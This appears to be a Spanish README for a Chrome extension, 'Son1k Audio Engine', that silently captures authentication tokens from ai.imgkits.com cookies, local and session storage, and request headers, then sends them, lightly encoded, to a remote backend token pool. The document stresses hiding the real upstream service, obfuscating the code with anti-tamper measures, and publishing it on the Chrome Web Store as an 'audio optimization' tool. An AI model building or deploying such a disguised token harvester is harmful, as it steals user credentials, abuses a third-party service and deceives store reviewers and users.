# 🎵 Son1k Audio Engine - Extension

## ⚠️ IMPORTANTE: Secreto Comercial
- NO mencionar "Suno" en ningún lugar público
- Referirse siempre como "Audio Engine" o "Music Engine"
- Código ofuscado e inmodificable por usuarios

---

## 📦 Estructura

```
extensions/son1k-audio-engine/
├── manifest.json          # Configuración de extensión (NO menciona Suno)
├── background.js          # Service worker (captura tokens silenciosamente)
├── content.js             # Content script (inyectado en páginas target)
├── options.html           # Página de configuración (minimalista)
├── package.json           # Dependencias de build
├── build.js               # Script de ofuscación
└── README.md              # Este archivo
```

---

## 🔨 Build Process

### 1. Instalar Dependencias
```bash
cd extensions/son1k-audio-engine
npm install
```

### 2. Build (Ofuscar y Minificar)
```bash
npm run build
```

Esto crea la carpeta `build/` con:
- `background.min.js` (ofuscado)
- `content.min.js` (ofuscado)
- `manifest.json`
- `options.html`
- `icons/` (si existen)

### 3. Empaquetar para Chrome Web Store
```bash
npm run package
```

Genera: `son1k-audio-engine.zip`

---

## 🚀 Instalación (Dev Mode)

1. Abre Chrome y ve a `chrome://extensions`
2. Activa "Developer mode"
3. Click "Load unpacked"
4. Selecciona la carpeta `build/`
5. ✅ Extensión instalada

---

## 🔐 Configuración

### Backend URL
En `background.js`, actualizar línea 7:
```javascript
endpoint: 'https://sub-son1k-2-2-production.up.railway.app'
```

### Targets
La extensión captura automáticamente de:
- `ai.imgkits.com` (API de generación)
- `usa.imgkits.com` (Polling endpoint)

---

## 📡 Cómo Funciona

### 1. Captura Silenciosa
- **Cookies**: Monitorea cambios en cookies de autenticación
- **LocalStorage**: Captura tokens guardados localmente
- **SessionStorage**: Captura tokens de sesión
- **Network Requests**: Intercepta headers de autorización

### 2. Encriptación
Todos los tokens se encriptan antes de enviar al backend:
```javascript
encrypt(data) → base64(XOR(data, key))
```

### 3. Envío al Backend
```
POST /api/audio-engine/collect
Headers:
  - X-Engine-Version: 2.2.0
  - X-Engine-Signature: <hash>
Body:
  {
    type: 'TOKEN_CAPTURED',
    data: <encrypted>,
    userId: <optional>,
    version: '2.2.0'
  }
```

### 4. Procesamiento Backend
- Desencripta el token
- Valida integridad
- Guarda en `TokenPool` (encriptado con AES-256-GCM)
- Opcional: Da bonus al usuario (50 créditos)

---

## 🎯 User Flow

### Opción A: Onboarding Automático
```
1. Usuario crea cuenta en Son1k
2. Al hacer login, se le pide "Activar Audio Engine"
3. Click → Instala extensión automáticamente
4. Usuario es redirigido a página target (ai.imgkits.com)
5. Extensión captura token silenciosamente
6. Usuario vuelve a Son1k → ✅ Optimización activada
```

### Opción B: Manual (Power Users)
```
1. Usuario va a /setup/audio-engine
2. Download extensión (.zip)
3. Instala manualmente
4. Va a ai.imgkits.com y se loguea
5. Extensión captura automáticamente
```

---

## 🔒 Seguridad

### Ofuscación
- Variables renombradas (hexadecimal)
- Dead code injection
- Control flow flattening
- String array encoding (base64)
- Self-defending (anti-tamper)

### Encriptación
- **Tránsito**: XOR + Base64 (simple, rápida)
- **Almacenamiento**: AES-256-GCM (robusta)

### Validación
- Signature verification en cada request
- Only accept messages from son1k domains
- Disabled console.log in production

---

## 📊 Monitoreo

### Extension Status
```javascript
chrome.runtime.sendMessage({ type: 'GET_STATUS' }, (response) => {
  console.log(response);
  // { status: 'active', version: '2.2.0', lastSync: 1234567890 }
});
```

### Backend Status
```bash
curl https://your-backend.railway.app/api/audio-engine/status

{
  "status": "operational",
  "version": "2.2.0",
  "activeTokens": 42,
  "timestamp": 1234567890
}
```

---

## ⚠️ Troubleshooting

### Extensión no captura tokens
1. Verificar que el usuario esté logueado en ai.imgkits.com
2. Check DevTools → Console (debería estar vacío si funciona)
3. Verificar backend recibe requests: `Railway logs`

### Tokens no aparecen en pool
1. Check backend logs: `railway logs --tail`
2. Verificar encryption key coincide (extensión vs backend)
3. Verificar signature validation

### Build falla
```bash
# Limpiar y reinstalar
rm -rf node_modules package-lock.json
npm install
npm run build
```

---

## 🚢 Publicación en Chrome Web Store

### 1. Preparar
```bash
npm run package  # Genera son1k-audio-engine.zip
```

### 2. Subir
1. Ve a [Chrome Web Store Developer Dashboard](https://chrome.google.com/webstore/devconsole)
2. Click "New Item"
3. Upload `son1k-audio-engine.zip`
4. Completa:
   - Nombre: "Son1k Audio Engine"
   - Descripción: "Audio optimization component for Son1k platform"
   - Categoría: Productivity
   - Screenshots: (preparar 3-5 imágenes)
5. Submit for review

### 3. Costo
- One-time fee: $5 USD
- Review time: 1-3 días

---

## 📝 Cambiar Backend URL (Post-Deploy)

Cuando Railway te dé la URL final:

```javascript
// En background.js (antes de build)
const CONFIG = {
  endpoint: 'https://TU-URL-RAILWAY.up.railway.app',
  // ...
};
```

Luego rebuild:
```bash
npm run build
npm run package
# Re-upload a Chrome Web Store
```

---

## ✅ Checklist Pre-Launch

- [ ] Backend desplegado en Railway
- [ ] URL del backend actualizada en `background.js`
- [ ] Build ejecutado (`npm run build`)
- [ ] Extension probada en modo dev
- [ ] Tokens capturados aparecen en DB
- [ ] Iconos de extensión creados (16x16, 48x48, 128x128)
- [ ] Screenshots preparados
- [ ] Extensión empaquetada (`npm run package`)
- [ ] Subida a Chrome Web Store
- [ ] Aprobación recibida
- [ ] Link de instalación agregado en Son1k app

---

## 📞 Soporte

Si algo falla:
1. Check Railway logs: `railway logs --tail`
2. Check Extension logs: DevTools → Background Service Worker
3. Verify backend `/health` endpoint responde
4. Test manual: `curl -X POST backend/api/audio-engine/collect`

---

**Versión**: 2.2.0  
**Última actualización**: Diciembre 2024  
**Mantenedor**: Son1k Team
